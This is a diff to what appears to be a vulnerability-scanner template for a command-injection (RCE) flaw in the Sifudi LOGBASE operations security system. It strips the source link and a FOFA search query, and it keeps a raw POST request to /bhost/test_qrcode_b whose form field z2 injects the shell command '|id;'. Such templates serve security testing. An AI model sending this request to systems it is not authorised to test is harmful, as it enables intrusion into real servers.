@@ -3,12 +3,8 @@ info:
   name: 思福迪运维安全管理系统 test_qrcode_b RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qqaeagrz9y2kgqxt'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qqaeagrz9y2kgqxt
-    fofa: app="思福迪-LOGBASE"
 http:
 - raw:
   - 'POST /bhost/test_qrcode_b HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     z1=1&z2="|id;"&z3=bhost
